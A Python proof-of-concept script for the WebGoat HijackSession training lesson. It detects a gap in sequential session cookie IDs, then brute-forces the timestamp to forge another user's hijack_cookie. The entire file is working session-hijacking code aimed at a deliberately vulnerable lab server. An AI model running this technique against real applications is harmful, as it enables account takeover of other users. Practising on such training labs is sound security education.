#!/usr/bin/env python3
import time
import requests
import re
from urllib.parse import urljoin

# PoC Script for WebGoat HijackSession Lesson (You have to set 're webGoat server address)
# Scans for the missing session ID and brute-forces its timestamp

# User inputs
JSESSIONID = input("Enter your JSESSIONID cookie value: ").strip()
USERNAME = input("Enter WebGoat username: ").strip()
PASSWORD = input("Enter WebGoat password: ").strip()

# Configuration constants
BASE_URL = 'http://192.168.1.20:8080' # the url of webGoat server
LOGIN_PATH = '/WebGoat/HijackSession/login'
LOGIN_URL = urljoin(BASE_URL, LOGIN_PATH)
SCAN_LIMIT = 1000      # Max login attempts to scan sequence
DELAY_SCAN = 0.05      # Delay between scan attempts (seconds)
DELAY_BRUTE = 0.0      # Delay between brute-force attempts (seconds)

# Initialize session
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
})
session.cookies.set('JSESSIONID', JSESSIONID, path='/WebGoat')


def scan_for_missing_session():
    """
    Scan login responses to detect a gap of 2 in hijack_cookie IDs.
    Returns the missing ID and its timestamp window (start_ts, end_ts).
    """
    prev_id = None
    prev_ts = None

    for attempt in range(1, SCAN_LIMIT + 1):
        resp = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD})
        if resp.status_code != 200:
            # Skip unauthorized or unexpected responses
            time.sleep(DELAY_SCAN)
            continue

        # Parse hijack_cookie from Set-Cookie header
        cookie_header = resp.headers.get('Set-Cookie', '')
        match = re.search(r'hijack_cookie=(\d+)-(\d+)', cookie_header)
        if not match:
            time.sleep(DELAY_SCAN)
            continue

        curr_id = int(match.group(1))
        curr_ts = int(match.group(2))

        # Detect a gap of exactly 2 in sequential IDs
        if prev_id is not None and curr_id - prev_id == 2:
            missing_id = prev_id + 1
            return missing_id, prev_ts, curr_ts

        prev_id, prev_ts = curr_id, curr_ts
        time.sleep(DELAY_SCAN)

    raise RuntimeError('Missing session ID not found within scan limit')


def brute_force_timestamp(session_id, start_ts, end_ts):
    """
    Try each timestamp in [start_ts, end_ts] for the given session ID
    until the lessonCompleted flag is returned in JSON response.
    """
    for ts in range(start_ts, end_ts + 1):
        forged_cookie = f"{session_id}-{ts}"
        # Build custom Cookie header with both JSESSIONID and hijack_cookie
        headers = {
            'Cookie': f'JSESSIONID={JSESSIONID}; hijack_cookie={forged_cookie}; Secure'
        }
        resp = session.post(LOGIN_URL, headers=headers,
                            data={'username': USERNAME, 'password': PASSWORD})
        # Check JSON for completion status
        try:
            result = resp.json()
        except ValueError:
            time.sleep(DELAY_BRUTE)
            continue

        if result.get('lessonCompleted'):
            return forged_cookie

        # Optional: print feedback for each attempt
        feedback = result.get('feedback', 'no feedback')
        print(f"[-] Attempt {forged_cookie}: {feedback}")
        time.sleep(DELAY_BRUTE)

    raise RuntimeError('Brute-force timestamp failed')


def main():
    print("[*] Scanning for missing session ID...")
    session_id, start_ts, end_ts = scan_for_missing_session()
    print(f"[+] Missing session ID: {session_id}")
    print(f"    Timestamp window: {start_ts} - {end_ts}")

    print(f"[*] Brute-forcing timestamp for ID {session_id}...")
    forged = brute_force_timestamp(session_id, start_ts, end_ts)
    print(f"[+] Success! Use hijack_cookie={forged}")


if __name__ == '__main__':
    main()
